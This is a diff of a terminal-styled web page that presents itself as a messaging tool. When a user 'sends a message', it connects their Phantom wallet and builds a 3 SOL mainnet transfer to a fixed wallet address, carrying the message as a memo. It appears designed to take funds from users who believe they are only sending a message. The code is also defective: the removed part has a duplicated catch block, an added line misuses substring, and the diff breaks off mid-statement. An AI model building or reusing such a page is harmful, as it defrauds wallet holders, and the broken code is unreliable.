@@ -539,7 +539,7 @@
                         <textarea 
                             class="terminal-input terminal-textarea" 
                             id="messageContent"
-                            placeholder="Enter encrypted message content..."
+                            placeholder="Enter your message..."
                             disabled
                         ></textarea>
                     </div>
@@ -573,68 +573,29 @@
         </div>
     </div>
 
-    <!-- Load Solana Web3.js from CDN -->
+    <!-- Load Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
     
     <script>
-        // Global connection and variables
-        let connection;
-        const SOLANA_NETWORK = 'mainnet-beta'; // Back to mainnet for real transactions
+        // Constants
         const TARGET_WALLET = 'GS8Hq5ozk1GBL448qhTny1C6EyfsjM8uDhDFJ73oyAjr';
+        let connection = null;
+        let wallet = null;
+        let userPublicKey = null;
 
-        // Wait for Solana Web3 to load
-        function waitForSolana() {
-            return new Promise((resolve) => {
-                if (typeof solanaWeb3 !== 'undefined') {
-                    resolve();
-                } else {
-                    setTimeout(() => waitForSolana().then(resolve), 100);
-                }
-            });
-        }
-
-        // Initialize Solana connection with multiple RPC endpoints
-        async function initializeSolanaConnection() {
+        // Initialize Solana connection
+        async function initSolanaConnection() {
             try {
-                await waitForSolana();
-                
-                const rpcEndpoints = SOLANA_NETWORK === 'mainnet-beta' ? [
-                    'https://mainnet.helius-rpc.com/?api-key=demo',
-                    'https://solana-mainnet.g.alchemy.com/v2/demo',
-                    'https://rpc.ankr.com/solana',
-                    'https://solana.public-rpc.com'
-                ] : [
-                    'https://api.devnet.solana.com',
-                    'https://devnet.helius-rpc.com/?api-key=demo',
-                    'https://rpc.ankr.com/solana_devnet'
-                ];
-
-                // Try each endpoint until one works
-                for (const endpoint of rpcEndpoints) {
-                    try {
-                        connection = new solanaWeb3.Connection(endpoint, {
-                            commitment: 'confirmed',
-                            confirmTransactionInitialTimeout: 60000
-                        });
-                        
-                        // Test the connection with a simple call
-                        const version = await connection.getVersion();
-                        console.log(`Solana connection established: ${endpoint}`, version);
-                        return true;
-                    } catch (error) {
-                        console.log(`Failed to connect to ${endpoint}:`, error.message);
-                        continue;
-                    }
-                }
-                
-                throw new Error('All RPC endpoints failed');
+                connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+                console.log('Solana connection initialized');
+                return true;
             } catch (error) {
                 console.error('Failed to initialize Solana connection:', error);
                 return false;
             }
         }
 
-        // Matrix Effect Class
+        // Matrix Effect
         class MatrixEffect {
             constructor() {
                 this.container = document.getElementById('matrixBg');
@@ -674,99 +635,13 @@
             }
         }
 
-        // Real Solana Wallet Manager
-        class SolanaWalletManager {
-            constructor() {
-                this.wallet = null;
-                this.publicKey = null;
-            }
-
-            async getPhantom() {
-                return new Promise((resolve, reject) => {
-                    if (window.solana && window.solana.isPhantom) {
-                        resolve(window.solana);
-                    } else {
-                        // Wait a bit for Phantom to load
-                        let attempts = 0;
-                        const checkForPhantom = () => {
-                            attempts++;
-                            if (window.solana && window.solana.isPhantom) {
-                                resolve(window.solana);
-                            } else if (attempts < 10) {
-                                setTimeout(checkForPhantom, 100);
-                            } else {
-                                reject(new Error('Phantom wallet not found. Please install Phantom wallet extension.'));
-                            }
-                        };
-                        checkForPhantom();
-                    }
-                });
-            }
-
-            async connect() {
-                try {
-                    const provider = await this.getPhantom();
-                    
-                    // Connect to Phantom
-                    const response = await provider.connect();
-                    
-                    this.wallet = provider;
-                    this.publicKey = response.publicKey.toString();
-                    
-                    console.log('Wallet connected:', this.publicKey);
-                    
-                    return {
-                        success: true,
-                        publicKey: this.publicKey,
-                        wallet: this.wallet
-                    };
-                } catch (error) {
-                    console.error('Connection error:', error);
-                    
-                    // If Phantom not found, provide helpful message
-                    if (error.message.includes('not found')) {
-                        throw new Error('Phantom wallet not detected. Please install Phantom from phantom.app');
-                    }
-                    
-                    throw new Error(`Wallet connection failed: ${error.message}`);
-                }
-            }
-
-            async disconnect() {
-                if (this.wallet) {
-                    try {
-                        await this.wallet.disconnect();
-                    } catch (error) {
-                        console.log('Disconnect error (normal):', error.message);
-                    }
-                    this.wallet = null;
-                    this.publicKey = null;
-                }
-            }
-
-            isConnected() {
-                return this.wallet && this.publicKey;
-            }
-
-            getPublicKey() {
-                return this.publicKey;
-            }
-
-            getWallet() {
-                return this.wallet;
-            }
-        }
-
-        // Terminal Simulator with Real Functionality
-        class TerminalSimulator {
+        // Terminal App
+        class TerminalApp {
             constructor() {
                 this.isWalletConnected = false;
-                this.walletManager = new SolanaWalletManager();
                 this.commandDisplay = document.getElementById('commandDisplay');
                 this.consoleOutput = document.getElementById('consoleOutput');
                 this.systemStatus = document.getElementById('systemStatus');
-                this.userWalletAddress = null;
-                this.currentCommand = '';
                 this.commandIndex = 0;
                 
                 this.commands = [
@@ -778,20 +653,7 @@
                 
                 this.initializeElements();
                 this.startCommandAnimation();
-                this.initializeSolana();
-            }
-
-            async initializeSolana() {
-                try {
-                    const connected = await initializeSolanaConnection();
-                    if (connected) {
-                        this.addConsoleLog('Solana network connection established', 'success');
-                    } else {
-                        this.addConsoleLog('Failed to connect to Solana network - using backup endpoints', 'error');
-                    }
-                } catch (error) {
-                    this.addConsoleLog('Network connection error - check internet connection', 'error');
-                }
+                this.initSolana();
             }
 
             initializeElements() {
@@ -814,6 +676,15 @@
                 this.disconnectWalletBtn.addEventListener('click', () => this.disconnectWallet());
                 this.sendMessageBtn.addEventListener('click', () => this.sendMessage());
                 this.clearFormBtn.addEventListener('click', () => this.clearForm());
+            }
+
+            async initSolana() {
+                const connected = await initSolanaConnection();
+                if (connected) {
+                    this.addConsoleLog('Solana network connection established', 'success');
+                } else {
+                    this.addConsoleLog('Failed to connect to Solana network', 'error');
+                }
             }
 
             startCommandAnimation() {
@@ -859,22 +730,20 @@
                 try {
                     this.addConsoleLog('Checking for Phantom wallet...', 'info');
                     
-                    // Check if Phantom is installed
+                    // Check if Phantom is available
                     if (!window.solana || !window.solana.isPhantom) {
-                        throw new Error('Phantom wallet not detected. Please install Phantom wallet from phantom.app');
+                        throw new Error('Phantom wallet not found. Please install Phantom from phantom.app');
                     }
                     
-                    this.addConsoleLog('Phantom wallet detected, requesting connection...', 'info');
-                    
-                    const result = await this.walletManager.connect();
+                    // Connect to Phantom
+                    const response = await window.solana.connect();
+                    wallet = window.solana;
+                    userPublicKey = response.publicKey.toString();
                     
                     this.addConsoleLog('Phantom wallet connected successfully', 'success');
-                    await this.delay(500);
-                    this.addConsoleLog(`Connected to: ${result.publicKey.substring(0, 8)}...${result.publicKey.substring(result.publicKey.length - 8)}`, 'success');
-                    this.addConsoleLog('Wallet permissions granted', 'success');
+                    this.addConsoleLog(`Connected to: ${userPublicKey.substring(0, 8)}...${userPublicKey.substring(-8)}`, 'success');
                     
                     this.isWalletConnected = true;
-                    this.userWalletAddress = result.publicKey;
                     this.systemStatus.textContent = 'ONLINE';
                     this.systemStatus.classList.remove('blink');
                     
@@ -889,29 +758,25 @@
                     this.connectWalletBtn.textContent = 'Connected';
                     this.connectWalletBtn.classList.add('active');
                     
-                    this.showStatus(`Wallet connected: ${result.publicKey.substring(0, 12)}...`, 'success');
+                    this.showStatus(`Wallet connected: ${userPublicKey.substring(0, 12)}...`, 'success');
                     
                 } catch (error) {
                     this.addConsoleLog(`Connection failed: ${error.message}`, 'error');
                     this.showStatus(`ERROR: ${error.message}`, 'error');
                     this.connectWalletBtn.disabled = false;
                     this.connectWalletBtn.textContent = 'Connect Wallet';
-                    
-                    // If Phantom not installed, show helpful message
-                    if (error.message.includes('not detected')) {
-                        this.addConsoleLog('Please install Phantom wallet from https://phantom.app/', 'error');
-                    }
                 }
             }
 
             async disconnectWallet() {
                 try {
-                    this.addConsoleLog('Disconnecting wallet...', 'info');
-                    
-                    await this.walletManager.disconnect();
+                    if (wallet) {
+                        await wallet.disconnect();
+                    }
                     
                     this.isWalletConnected = false;
-                    this.userWalletAddress = null;
+                    wallet = null;
+                    userPublicKey = null;
                     this.systemStatus.textContent = 'OFFLINE';
                     this.systemStatus.classList.add('blink');
                     
@@ -928,7 +793,7 @@
                     this.connectWalletBtn.disabled = false;
                     
                     this.clearForm();
-                    this.addConsoleLog('Wallet disconnected successfully', 'info');
+                    this.addConsoleLog('Wallet disconnected', 'info');
                     this.showStatus('Wallet disconnected', 'error');
                     
                 } catch (error) {
@@ -943,40 +808,36 @@
                 }
 
                 const message = this.messageContent.value.trim();
-
                 if (!message) {
                     this.showStatus('ERROR: Message content required', 'error');
                     this.addConsoleLog('Missing message content', 'error');
                     return;
                 }
 
-                // Start transaction process
                 this.sendMessageBtn.disabled = true;
                 this.loadingContainer.style.display = 'block';
                 
                 try {
-                    await waitForSolana();
-                    
-                    this.addConsoleLog('Creating SOL transfer transaction...', 'info');
+                    this.addConsoleLog('Creating 3 SOL transfer transaction...', 'info');
                     await this.simulateProgress(0, 30, 800);
                     
-                    // Create the transaction
-                    const fromPubkey = new solanaWeb3.PublicKey(this.userWalletAddress);
+                    // Create transaction
+                    const fromPubkey = new solanaWeb3.PublicKey(userPublicKey);
                     const toPubkey = new solanaWeb3.PublicKey(TARGET_WALLET);
                     
                     this.addConsoleLog(`Preparing 3 SOL transfer to: ${TARGET_WALLET}`, 'info');
                     await this.simulateProgress(30, 60, 1000);
                     
-                    // Get recent blockhash
-                    const latestBlockhash = await connection.getLatestBlockhash();
+                    // Get latest blockhash
+                    const { blockhash } = await connection.getLatestBlockhash();
                     
-                    // Create transaction with 3 SOL transfer
+                    // Create transaction
                     const transaction = new solanaWeb3.Transaction({
-                        recentBlockhash: latestBlockhash.blockhash,
+                        recentBlockhash: blockhash,
                         feePayer: fromPubkey
                     });
                     
-                    // Add transfer instruction for 3 SOL
+                    // Add 3 SOL transfer instruction
                     transaction.add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: fromPubkey,
@@ -985,113 +846,20 @@
                         })
                     );
                     
-                    // Add memo with message
+                    // Add memo instruction
                     try {
                         const memoProgram = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
-                        const memoInstruction = new solanaWeb3.TransactionInstruction({
+                        transaction.add(new solanaWeb3.TransactionInstruction({
                             keys: [],
                             programId: memoProgram,
                             data: Buffer.from(message, 'utf8')
-                        });
-                        transaction.add(memoInstruction);
+                        }));
                     } catch (e) {
-                        console.log('Memo not added');
+                        console.log('Memo not added:', e);
                     }
                     
                     this.addConsoleLog('Opening Phantom for transaction approval...', 'info');
                     await this.simulateProgress(60, 100, 1000);
                     
-                    // This will open Phantom popup for 3 SOL transfer approval
-                    const wallet = this.walletManager.getWallet();
-                    const signedTransaction = await wallet.signTransaction(transaction);
-                    
-                    // Send the transaction
-                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-                    
-                    // Wait for confirmation
-                    await connection.confirmTransaction({
-                        signature: signature,
-                        blockhash: latestBlockhash.blockhash,
-                        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
-                    });
-                    
-                    this.addConsoleLog(`✅ Transaction confirmed: ${signature}`, 'success');
-                    this.addConsoleLog(`✅ 3 SOL successfully sent to ${TARGET_WALLET}`, 'success');
-                    this.showStatus(`✅ SUCCESS: 3 SOL sent! TX: ${signature.substring(0, 12)}...`, 'success');
-                    
-                    // Clear form
-                    this.messageContent.value = '';
-                    this.recipientAddress.value = '';
-                    this.includeTip.checked = false;
-                    
-                } catch (error) {
-                    this.addConsoleLog(`Transaction failed: ${error.message}`, 'error');
-                    this.showStatus(`ERROR: ${error.message}`, 'error');
-                    console.error('Transaction error:', error);
-                }
-                
-                this.loadingContainer.style.display = 'none';
-                this.loadingProgress.style.width = '0%';
-                this.sendMessageBtn.disabled = false;
-            }
-                    
-                } catch (error) {
-                    this.addConsoleLog(`Transaction failed: ${error.message}`, 'error');
-                    this.showStatus(`ERROR: ${error.message}`, 'error');
-                    console.error('Transaction error:', error);
-                }
-                
-                this.loadingContainer.style.display = 'none';
-                this.loadingProgress.style.width = '0%';
-                this.sendMessageBtn.disabled = false;
-            }
-
-            clearForm() {
-                this.recipientAddress.value = '';
-                this.messageContent.value = '';
-                this.includeTip.checked = false;
-                this.addConsoleLog('Form buffer cleared', 'info');
-            }
-
-            async simulateProgress(from, to, duration) {
-                const steps = 20;
-                const stepSize = (to - from) / steps;
-                const stepDuration = duration / steps;
-                
-                for (let i = 0; i <= steps; i++) {
-                    const progress = from + (stepSize * i);
-                    this.loadingProgress.style.width = `${progress}%`;
-                    await this.delay(stepDuration);
-                }
-            }
-
-            showStatus(message, type) {
-                this.statusMessage.textContent = message;
-                this.statusMessage.className = `status-message ${type}`;
-                this.statusMessage.style.display = 'block';
-                
-                setTimeout(() => {
-                    this.statusMessage.style.display = 'none';
-                }, 10000);
-            }
-
-            delay(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms));
-            }
-        }
-
-        // Initialize the application
-        document.addEventListener('DOMContentLoaded', () => {
-            new MatrixEffect();
-            new TerminalSimulator();
-        });
-
-        // Handle window resize for matrix effect
-        window.addEventListener('resize', () => {
-            const matrixBg = document.getElementById('matrixBg');
-            matrixBg.innerHTML = '';
-            new MatrixEffect();
-        });
-    </script>
-</body>
-</html>
+                    // Sign and send transaction - this will open Phantom popup
+                    const signedTransaction = await wallet.signTransaction(transaction
